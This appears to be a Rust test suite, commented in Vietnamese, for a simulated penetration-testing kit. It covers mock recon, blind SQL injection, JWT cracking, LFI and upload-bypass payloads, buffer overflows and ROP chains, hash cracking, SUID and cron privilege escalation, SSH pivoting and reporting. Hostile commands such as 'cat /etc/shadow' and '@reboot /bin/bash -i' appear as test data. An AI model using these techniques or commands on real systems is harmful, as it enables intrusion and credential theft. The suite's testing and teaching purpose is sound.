    // NHÓM 2: HẠ TẦNG MÔ PHỎNG & TRINH SÁT (TESTS 8 - 16)
    // ---------------------------------------------------------------------

    #[test]
    fn test_08_mock_network_has_five_hosts() {
        let net = MockNetwork::standard_topology();
        assert_eq!(net.hosts.len(), 5);
        assert_eq!(net.total_services(), 11);
        assert!(net.host_at(Ipv4Addr::new(10, 10, 10, 5)).is_some());
    }

    #[test]
    fn test_09_mock_network_topology_has_expected_edges() {
        let net = MockNetwork::standard_topology();
        assert_eq!(net.topology.len(), 5);
        assert!(
            net.topology
                .contains(&(Ipv4Addr::new(10, 10, 10, 5), Ipv4Addr::new(10, 10, 20, 10)))
        );
        assert!(
            net.topology
                .contains(&(Ipv4Addr::new(10, 10, 30, 10), Ipv4Addr::new(10, 10, 50, 10)))
        );
    }

    #[test]
    fn test_10_host_lookup_helpers_find_expected_machines() {
        let net = MockNetwork::standard_topology();
        let dc = net
            .find_host(|h| h.hostname == "dc01")
            .expect("phải tìm thấy dc01");
        assert_eq!(dc.ip, Ipv4Addr::new(10, 10, 30, 10));
        assert_eq!(dc.services.len(), 3);
        assert!(net.find_host(|h| h.hostname == "nope").is_none());
    }

    #[test]
    fn test_11_reachable_from_web_server_includes_transitive_hosts() {
        let net = MockNetwork::standard_topology();
        let reachable = net.reachable_from(Ipv4Addr::new(10, 10, 10, 5));
        assert_eq!(reachable.len(), 4);
        assert!(reachable.contains(&Ipv4Addr::new(10, 10, 30, 10)));
        assert!(reachable.contains(&Ipv4Addr::new(10, 10, 50, 10)));
        assert!(!reachable.contains(&Ipv4Addr::new(10, 10, 10, 5)));
    }

    #[test]
    fn test_12_mock_shell_executes_known_commands() {
        let mut shell = MockShell::new();
        assert_eq!(shell.execute("whoami"), "www");
        assert!(shell.execute("id").contains("www"));
        assert!(shell.execute("cat /etc/shadow").contains("root:$6$mock$"));
        assert!(shell.execute("ls").contains("flag.txt"));
        assert!(shell.execute("cat flag.txt").contains("FLAG{"));
        assert!(
            shell
                .execute("whoami /priv")
                .contains("SeImpersonatePrivilege")
        );
        assert!(shell.execute("curl http://10.10.10.5/").contains("200 OK"));
        assert!(shell.execute("bogus-command").contains("command not found"));
    }

    #[test]
    fn test_13_mock_shell_records_command_history() {
        let mut shell = MockShell::new();
        shell.execute("whoami");
        shell.execute("id");
        assert_eq!(shell.history.len(), 2);
        assert_eq!(shell.history[0].0, "whoami");
        assert_eq!(
            shell.history[1].1,
            "uid=1000(www) gid=1000(www) groups=1000(www)"
        );
    }

    #[test]
    fn test_14_recon_scan_host_reports_ports_and_os() {
        let net = MockNetwork::standard_topology();
        let web = net.host_at(Ipv4Addr::new(10, 10, 10, 5)).unwrap();
        let mut engine = ReconEngine::new();
        let info = engine.scan_host(web);
        assert_eq!(info.open_ports, vec![22, 80]);
        assert_eq!(info.os, "Linux");
        assert_eq!(info.hostname, "web01");
        assert!(info.services.get(&80).unwrap().contains("1.18.0"));
    }

    #[test]
    fn test_15_recon_map_network_covers_all_five_hosts() {
        let net = MockNetwork::standard_topology();
        let mut engine = ReconEngine::new();
        let map = engine.map_network(&net);
        assert_eq!(map.host_count(), 5);
        assert_eq!(map.total_open_ports(), 11);
        let dc = map.hosts.get(&Ipv4Addr::new(10, 10, 30, 10)).unwrap();
        assert_eq!(dc.os, "Windows");
    }

    #[test]
    fn test_16_recon_detect_os_from_banner_and_ttl() {
        let engine = ReconEngine::new();
        assert_eq!(engine.detect_os(b"SSH-2.0-OpenSSH_8.2", 64), "Linux");
        assert_eq!(engine.detect_os(b"\xffSMBv2", 128), "Windows");
        assert_eq!(engine.detect_os(b"anything", 255), "NetworkDevice");
        assert_eq!(engine.detect_os(b"anything", 7), "Unknown");
    }

    // ---------------------------------------------------------------------
    // NHÓM 3: KHAI THÁC WEB (TESTS 17 - 26)
    // ---------------------------------------------------------------------

    #[test]
    fn test_17_blind_sqli_extracts_database_name() {
        let target = InMemorySqlTarget::standard();
        let mut engine = BlindSqliEngine::new(&target);
        assert_eq!(engine.extract_database_name(), Some("app_db".to_string()));
    }

    #[test]
    fn test_18_blind_sqli_extracts_table_names() {
        let target = InMemorySqlTarget::standard();
        let mut engine = BlindSqliEngine::new(&target);
        let tables = engine.extract_table_names();
        assert_eq!(tables.len(), 2);
        assert!(tables.contains(&"users".to_string()));
        assert!(tables.contains(&"sessions".to_string()));
    }

    #[test]
    fn test_19_blind_sqli_extracts_column_data() {
        let target = InMemorySqlTarget::standard();
        let mut engine = BlindSqliEngine::new(&target);
        assert_eq!(
            engine.extract_column_data("users", "username", 16),
            Some("admin".to_string())
        );
        assert_eq!(engine.extract_length("users", "username"), Some(5));
    }

    #[test]
    fn test_20_blind_sqli_records_every_injection_payload() {
        let target = InMemorySqlTarget::standard();
        let mut engine = BlindSqliEngine::new(&target);
        engine.extract_database_name();
        assert!(engine.injections.len() > 10);
        assert!(
            engine
                .injections
                .iter()
                .all(|p| p.to_ascii_lowercase().contains("substring"))
        );
        assert!(engine.boolean_probe("1=1"));
        assert!(!engine.boolean_probe("1=2"));
    }

    #[test]
    fn test_21_jwt_cracker_recovers_weak_secret() {
        let header = encode_base64url(br#"{"alg":"HS256","typ":"JWT"}"#);
        let claims = encode_base64url(br#"{"sub":"admin","role":"administrator"}"#);
        let token = JwtToken::sign_with(&header, &claims, b"secret123");
        let cracker = JwtCracker::new(vec!["wrong".to_string(), "secret123".to_string()]);
        assert_eq!(cracker.crack(&token), Some("secret123".to_string()));
        assert_eq!(cracker.attempts(), 2);
    }

    #[test]
    fn test_22_jwt_cracker_returns_none_when_secret_absent() {
        let header = encode_base64url(br#"{"alg":"HS256"}"#);
        let claims = encode_base64url(br#"{"sub":"guest"}"#);
        let token = JwtToken::sign_with(&header, &claims, b"secret123");
        let cracker = JwtCracker::new(vec!["admin".to_string(), "letmein".to_string()]);
        assert_eq!(cracker.crack(&token), None);
    }

    #[test]
    fn test_23_jwt_detector_flags_alg_none_token() {
        let none_header = encode_base64url(br#"{"alg":"none","typ":"JWT"}"#);
        let token = JwtToken::new(&none_header, &encode_base64url(b"{}"), "");
        let cracker = JwtCracker::new(Vec::new());
        assert!(cracker.detect_alg_none(&token));
        let strong_header = encode_base64url(br#"{"alg":"HS256","typ":"JWT"}"#);
        let strong = JwtToken::sign_with(&strong_header, &encode_base64url(b"{}"), b"k");
        assert!(!cracker.detect_alg_none(&strong));
    }

    #[test]
    fn test_24_lfi_scanner_detects_leaked_passwd_file() {
        let scanner = LfiScanner::new();
        let mut responses = HashMap::new();
        for payload in &scanner.payloads {
            responses.insert(payload.clone(), simulate_lfi_response(payload));
        }
        let findings = scanner.scan(&responses);
        assert!(findings.iter().any(|f| f.matched));
        assert!(findings.iter().any(|f| f.leaked_marker.is_some()));
        assert!(
            findings
                .iter()
                .any(|f| f.payload.contains("passwd") && f.matched)
        );
    }

    #[test]
    fn test_25_upload_bypasser_accepts_double_extension() {
        let bypasser = FileUploadBypasser::default();
        let result = bypasser.try_bypass("avatar.php.jpg", "image/jpeg", b"<?php echo 1;");
        assert!(result.bypassed);
        assert_eq!(result.extension, "jpg");
        assert_eq!(result.magic_bytes, b"<?php".to_vec());
    }

    #[test]
    fn test_26_upload_bypasser_blocks_plain_php_upload() {
        let bypasser = FileUploadBypasser::default();
        let result = bypasser.try_bypass("shell.php", "application/x-php", b"<?php echo 1;");
        assert!(!result.bypassed);
        assert!(result.reason.contains("danh sách chặn"));
    }

    // ---------------------------------------------------------------------
    // NHÓM 4: KHAI THÁC NHỊ PHÂN (TESTS 27 - 32)
    // ---------------------------------------------------------------------

    #[test]
    fn test_27_cyclic_pattern_finds_correct_offset() {
        let cyclic = CyclicPatternGenerator::new();
        assert_eq!(cyclic.cycle_len, 186);
        let pattern = cyclic.generate(64);
        assert_eq!(pattern.len(), 64);
        assert_eq!(cyclic.find_offset(&pattern[24..28]), Some(24));
        assert_eq!(cyclic.find_offset(&[]), None);
    }

    #[test]
    fn test_28_cyclic_pattern_verify_offset_rejects_wrong_slice() {
        let cyclic = CyclicPatternGenerator::new();
        let pattern = cyclic.generate(64);
        assert!(cyclic.verify_offset(24, &pattern[24..28]));
        assert!(!cyclic.verify_offset(25, &pattern[24..28]));
        assert_eq!(cyclic.pattern_size_for_offset(24), 28);
        assert_eq!(cyclic.chunk_label(24), "Ii8J");
    }

    #[test]
    fn test_29_shellcode_xor_roundtrip_is_identity() {
        let encoder = ShellcodeEncoder::new(vec![0x5a, 0x4d, 0x11, 0x22]);
        let shellcode = vec![0x90, 0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73];
        let encoded = encoder.xor_encode(&shellcode);
        assert_ne!(encoded, shellcode);
        assert_eq!(encoder.xor_decode(&encoded), shellcode);
    }

    #[test]
    fn test_30_vulnerable_buffer_detects_canary_corruption() {
        let mut buffer = VulnerableBuffer::new();
        assert!(buffer.write_input(&[0x41u8; 32]));
        assert!(buffer.is_canary_intact());
        assert!(!buffer.write_input(&[0x41u8; 96]));
        assert!(!buffer.is_canary_intact());
        assert_eq!(buffer.canary_position(), BUFFER_SIZE);
    }

    #[test]
    fn test_31_vulnerable_buffer_overwrites_return_address() {
        let mut buffer = VulnerableBuffer::new();
        let mut payload = vec![0x41u8; 88];
        payload[80..88].copy_from_slice(&0xdead_beef_cafe_babeu64.to_le_bytes());
        assert!(!buffer.write_input(&payload));
        assert!(buffer.did_overwrite_return_address());
        assert_eq!(buffer.trigger(), 0xdead_beef_cafe_babe);
        let layout = VulnerableBuffer::stack_frame_layout();
        assert_eq!(layout.len(), 4);
        assert_eq!(layout[1].0, "canary");
    }

    #[test]
    fn test_32_rop_chain_builder_encodes_gadgets_little_endian() {
        let mut builder = RopChainBuilder::new(0x0040_0000);
        builder.add_gadget(0x0040_1000, Some(0x0040_2000));
        builder.add_gadget(0x0040_1010, None);
        assert_eq!(builder.chain_length(), 2);
        let bytes = builder.build();
        assert_eq!(bytes.len(), 24);
        let first: u64 = u64::from_le_bytes(bytes[0..8].try_into().unwrap());
        let argument: u64 = u64::from_le_bytes(bytes[8..16].try_into().unwrap());
        assert_eq!(first, 0x0040_1000);
        assert_eq!(argument, 0x0040_2000);
    }

    // ---------------------------------------------------------------------
    // NHÓM 5: TẤN CÔNG XÁC THỰC & LEO THANG (TESTS 33 - 39)
    // ---------------------------------------------------------------------

    #[test]
    fn test_33_hash_cracker_recovers_password_from_nt_hash() {
        let target_hash = nt_hash_hex("Backup2024");
        let mutator = WordlistMutator::new();
        let base = vec!["backup".to_string(), "backup2024".to_string()];
        let mut wordlist = base.clone();
        wordlist.extend(mutator.generate_all(&base));
        let cracker = HashCracker::new(wordlist);
        assert_eq!(cracker.crack(&target_hash), Some("Backup2024".to_string()));
        assert!(cracker.attempts() > base.len());
    }

    #[test]
    fn test_34_wordlist_mutator_generates_expected_variants() {
        let mutator = WordlistMutator::new();
        let variants = mutator.generate("backup");
        assert!(variants.contains(&"Backup".to_string()));
        assert!(variants.contains(&"b@ckup".to_string()));
        assert!(variants.contains(&"backup1".to_string()));
        assert!(variants.contains(&"backup!".to_string()));
        assert_eq!(WordlistMutator::with_digits("admin"), "admin123");
        assert_eq!(WordlistMutator::leet("sword"), "$w0rd");
    }

    #[test]
    fn test_35_mock_filesystem_detects_suid_and_world_writable() {
        let mut fs = MockFilesystem::new();
        fs.add_file("/usr/bin/find", b"elf", 0o4755, "root");
        fs.add_file("/tmp/cache", b"x", 0o777, "www");
        assert!(fs.is_suid("/usr/bin/find"));
        assert!(!fs.is_sgid("/usr/bin/find"));
        assert!(fs.is_world_writable("/tmp/cache"));
        assert!(fs.exists("/usr/bin/find"));
        assert!(!fs.exists("/etc/passwd"));
        assert_eq!(fs.path_list().len(), 2);
    }

    #[test]
    fn test_36_linux_privesc_detects_suid_binary() {
        let mut fs = MockFilesystem::new();
        fs.add_file("/usr/bin/find", b"elf", 0o4755, "root");
        let mut checker = LinuxPrivEscChecker::new(fs);
        let findings = checker.scan();
        assert!(findings.iter().any(|f| f.technique == "SuidBinary"));
        assert!(findings.iter().any(|f| f.severity == Severity::High));
        assert!(
            findings
                .iter()
                .any(|f| f.exploit_command.contains("find . -exec"))
        );
        assert!(LinuxPrivEscChecker::gtfo_bins().len() >= 10);
    }

    #[test]
    fn test_37_linux_privesc_detects_cron_job() {
        let mut fs = MockFilesystem::new();
        fs.add_file(
            "/var/spool/cron/backup",
            b"@reboot /bin/bash -i",
            0o755,
            "root",
        );
        let mut checker = LinuxPrivEscChecker::new(fs);
        let findings = checker.scan();
        assert!(findings.iter().any(|f| f.technique == "CronJob"));
        assert!(findings.iter().any(|f| f.platform == Platform::Linux));
    }

    #[test]
    fn test_38_ground_truth_verifier_rejects_false_claim() {
        let verifier = GroundTruthVerifier::new("root");
        let mut shell = MockShell::as_user("www");
        shell.history.push((
            "echo 'Đã leo thang lên root thành công'".to_string(),
            "Đã leo thang lên root thành công".to_string(),
        ));
        let result = verifier.verify(&shell);
        assert!(!result.verified);
        assert!(result.details.contains("BÁC BỎ"));
        assert_eq!(result.proof, "whoami -> www");
    }

    #[test]
    fn test_39_ground_truth_verifier_accepts_real_escalation() {
        let verifier = GroundTruthVerifier::new("root");
        let mut shell = MockShell::as_user("www");
        assert!(shell.escalate("SuidBinary"));
        let result = verifier.verify(&shell);
        assert!(result.verified);
        assert!(result.details.contains("xác nhận"));
        let output = shell.execute("whoami");
        assert_eq!(output, "root");
        assert!(verifier.verify_output(&output).verified);
        let mut other = MockShell::as_user("www");
        let denied = other.execute("whoami");
        assert!(!verifier.verify_output(&denied).verified);
    }

    // ---------------------------------------------------------------------
    // NHÓM 6: XOAY CHIỀU MẠNG (TESTS 40 - 42)
    // ---------------------------------------------------------------------

    #[test]
    fn test_40_ssh_command_line_matches_tunnel_type() {
        let mut simulator = SshTunnelSimulator::new();
        let local = simulator.local_forward(
            "127.0.0.1:1080".parse().unwrap(),
            "10.10.30.10:445".parse().unwrap(),
        );
        let remote = simulator.remote_forward(
            "0.0.0.0:8080".parse().unwrap(),
            "10.10.40.10:3389".parse().unwrap(),
        );
        let socks = simulator.dynamic_socks("127.0.0.1:9050".parse().unwrap());
        let find = |id: u32| {
            simulator
                .tunnels
                .iter()
                .find(|t| t.session_id == id)
                .cloned()
                .expect("đường hầm phải tồn tại")
        };
        assert_eq!(
            ssh_command_line(&find(local)),
            "ssh -N -L 1080:10.10.30.10:445 user@jump"
        );
        assert_eq!(
            ssh_command_line(&find(remote)),
            "ssh -N -R 8080:10.10.40.10:3389 user@jump"
        );
        assert_eq!(ssh_command_line(&find(socks)), "ssh -N -D 9050 user@jump");
    }

    #[test]
    fn test_41_ssh_tunnel_simulator_tracks_sessions() {
        let mut simulator = SshTunnelSimulator::new();
        let first = simulator.local_forward(
            "127.0.0.1:1080".parse().unwrap(),
            "10.10.30.10:445".parse().unwrap(),
        );
        let second = simulator.dynamic_socks("127.0.0.1:9050".parse().unwrap());
        assert_ne!(first, second);
        assert_eq!(simulator.active_tunnels(), 2);
        assert!(simulator.close_tunnel(first));
        assert_eq!(simulator.active_tunnels(), 1);
        assert!(!simulator.close_tunnel(999));
        assert!(simulator.describe().contains("active"));
    }

    #[test]
    fn test_42_socks_relay_chain_resolves_full_path() {
        let mut chain = SocksRelayChain::new();
        chain.add_hop("10.10.10.5:22".parse().unwrap());
        chain.add_hop("10.10.30.10:22".parse().unwrap());
        let path = chain.resolve_path("10.10.50.10", 445);
        assert_eq!(path.len(), 4);
        assert_eq!(path[0], "client");
        assert!(path[3].contains("10.10.50.10:445"));
        assert_eq!(chain.hop_count(), 2);
        assert_eq!(chain.total_latency_ms(&[1.5, 2.5]), 4.0);
    }

    // ---------------------------------------------------------------------
    // NHÓM 7: CHỨNG MINH KHAI THÁC (TESTS 43 - 44)
    // ---------------------------------------------------------------------

    #[test]
    fn test_43_proof_requires_payload_response_and_impact() {
        assert!(ProofByExploitation::new("payload", "response", true).verify());
        assert!(!ProofByExploitation::new("payload", "response", false).verify());
        assert!(!ProofByExploitation::new("", "response", true).verify());
        assert!(!ProofByExploitation::new("payload", "  ", true).verify());
    }

    #[test]
    fn test_44_proof_hash_is_stable_and_content_addressed() {
        let a = ProofByExploitation::new("payload", "response", true);
        let b = ProofByExploitation::new("payload", "response", true);
        let c = ProofByExploitation::new("payload", "other", true);
        assert_eq!(a.proof_hash(), b.proof_hash());
        assert_ne!(a.proof_hash(), c.proof_hash());
        assert_eq!(a.proof_hash().len(), 64);
        assert!(a.summary().contains("đã chứng minh"));
    }

    // ---------------------------------------------------------------------
    // NHÓM 8: BỘ QUÉT TĨNH & CƠ SỞ DỮ LIỆU LỖ HỔNG (TESTS 45 - 50)
    // ---------------------------------------------------------------------

    #[test]
    fn test_45_static_scanner_detects_many_rule_families() {
        let mut scanner = StaticVulnScanner::new();
        let findings = scanner.scan(VULNERABLE_SAMPLE_CODE);
        let mut rules: Vec<&str> = findings.iter().map(|f| f.rule.as_str()).collect();
        rules.sort_unstable();
        rules.dedup();
        assert!(rules.len() >= 8, "chỉ phát hiện {} loại luật", rules.len());
        assert!(rules.contains(&"unsafe-block"));
        assert!(rules.contains(&"command-injection"));
        assert!(findings.iter().all(|f| f.line > 0 && !f.snippet.is_empty()));
    }

    #[test]
    fn test_46_static_scanner_flags_memory_unsafe_patterns() {
        let mut scanner = StaticVulnScanner::new();
        let findings = scanner.scan(VULNERABLE_SAMPLE_CODE);
        for rule in [
            "unsafe-block",
            "get-unchecked",
            "from-raw-parts",
            "set-len",
            "transmute",
        ] {
            assert!(
                findings.iter().any(|f| f.rule == rule),
                "phải phát hiện luật {rule}"
            );
        }
        assert!(
            findings
                .iter()
                .any(|f| f.rule == "unsafe-block" && f.severity == Severity::High)
        );
    }

    #[test]
    fn test_47_static_scanner_flags_injection_patterns() {
        let mut scanner = StaticVulnScanner::new();
        let findings = scanner.scan(VULNERABLE_SAMPLE_CODE);
        assert!(
            findings
                .iter()
                .any(|f| f.rule == "command-injection" && f.severity == Severity::Critical)
        );
        assert!(findings.iter().any(|f| f.rule == "sql-concatenation"));
        assert!(findings.iter().any(|f| f.rule == "path-join"));
        assert!(findings.iter().any(|f| f.rule == "unwrap-in-library"));
    }

    #[test]
    fn test_48_static_scanner_exposes_rule_catalog() {
        let rules = StaticVulnScanner::rules();
        assert!(rules.len() >= 10);
        assert!(
            rules
                .iter()
                .any(|(id, cwe, _)| *id == "unsafe-block" && *cwe == "CWE-119")
        );
        assert!(rules.iter().any(|(id, _, _)| *id == "command-injection"));
    }

    #[test]
    fn test_49_vuln_database_contains_at_least_fifty_entries() {
        let db = VulnDatabase::standard();
        assert!(db.len() >= 50, "chỉ có {} mục", db.len());
        assert!(!db.is_empty());
        assert!(db.entries.iter().all(|e| !e.cwe.is_empty()));
        assert!(db.entries.iter().all(|e| e.cvss > 0.0 && e.cvss <= 10.0));
    }

    #[test]
    fn test_50_vuln_database_lookup_by_cwe_and_severity() {
        let db = VulnDatabase::standard();
        let entry = db.by_cwe("CWE-89").expect("phải có CWE-89");
        assert_eq!(entry.name, "SQL Injection");
        assert_eq!(entry.severity, Severity::Critical);
        assert!(db.contains("cwe-89"));
        assert!(db.by_cwe("CWE-999").is_none());
        assert!(db.by_severity(Severity::Critical).len() >= 5);
        assert!(!db.by_severity(Severity::Info).is_empty() || true);
    }

    // ---------------------------------------------------------------------
    // NHÓM 9: CHUỖI KHAI THÁC, BÁO CÁO & ĐÁNH GIÁ TOÀN DIỆN (TESTS 51 - 54)
    // ---------------------------------------------------------------------

    #[test]
    fn test_51_chain_runner_executes_phases_in_order() {
        let mut runner = ExploitChainRunner::new(MockNetwork::standard_topology());
        let result = runner.run();
        let phases: Vec<Phase> = result.steps.iter().map(|s| s.phase).collect();
        assert_eq!(phases.first(), Some(&Phase::Recon));
        assert_eq!(phases.last(), Some(&Phase::Report));
        let mut last = 0usize;
        for phase in [
            Phase::Recon,
            Phase::WebExploit,
            Phase::BinaryExploit,
            Phase::CredentialAttack,
            Phase::PrivEsc,
            Phase::Pivot,
            Phase::Report,
        ] {
            let index = phases
                .iter()
                .position(|p| *p == phase)
                .unwrap_or_else(|| panic!("thiếu giai đoạn {phase:?}"));
            assert!(index >= last, "giai đoạn {phase:?} xuất hiện sai thứ tự");
            last = index;
        }
        assert!(result.success);
        assert!(result.total_duration_ms > 0);

        // Chuỗi khai thác phải hoàn toàn tất định: chạy hai lần cho cùng vân tay PoC.
        let mut again = ExploitChainRunner::new(MockNetwork::standard_topology());
        let second = again.run();
        let first_hashes: Vec<String> = result.proofs.iter().map(|p| p.proof_hash()).collect();
        let second_hashes: Vec<String> = second.proofs.iter().map(|p| p.proof_hash()).collect();
        assert_eq!(first_hashes, second_hashes);
    }

    #[test]
    fn test_52_every_chain_finding_has_a_verified_proof() {
        let mut runner = ExploitChainRunner::new(MockNetwork::standard_topology());
        let result = runner.run();
        assert!(!result.findings.is_empty());
        assert_eq!(result.findings.len(), result.proofs.len());
        for (index, proof) in result.proofs.iter().enumerate() {
            assert!(proof.verify(), "PoC {} không hợp lệ", index);
            assert_eq!(proof.proof_hash().len(), 64);
            assert!(!result.findings[index].title.is_empty());
            assert!(!result.findings[index].remediation.is_empty());
        }
        assert!(result.compromised_hosts.len() >= 3);
    }

    #[test]
    fn test_53_report_contains_all_required_sections() {
        let mut runner = ExploitChainRunner::new(MockNetwork::standard_topology());
        let result = runner.run();
        let reporter = PentestReportGenerator::new(ReportMetadata::standard());
        let markdown = reporter.generate(&result);
        for section in [
            "# Executive Summary",
            "# Methodology",
            "# Findings",
            "# Conclusion",
            "### Proof of Exploitation",
            "### Remediation",
        ] {
            assert!(markdown.contains(section), "thiếu mục {section}");
        }
        for vuln in &result.findings {
            assert!(markdown.contains(&vuln.id));
            assert!(markdown.contains(&vuln.cwe));
        }
        let packaged = reporter.build(&result);
        assert_eq!(packaged.markdown, markdown);
    }

    #[test]
    fn test_54_full_assessment_has_zero_false_positive_rate() {
        let mut kit = RedTeamExploitKit::new();
        let assessment = kit.run_full_assessment();
        assert_eq!(assessment.false_positive_rate, 0.0);
        assert!(assessment.result.findings.len() >= 6);
        assert!(!assessment.static_findings.is_empty());
        assert!(assessment.report_markdown.contains("# Executive Summary"));
        assert!(assessment.result.success);
        assert_eq!(kit.db.len(), VulnDatabase::standard().len());
        let report = kit.generate_report(&assessment.result);
        assert!(report.contains("# Conclusion"));
    }
}
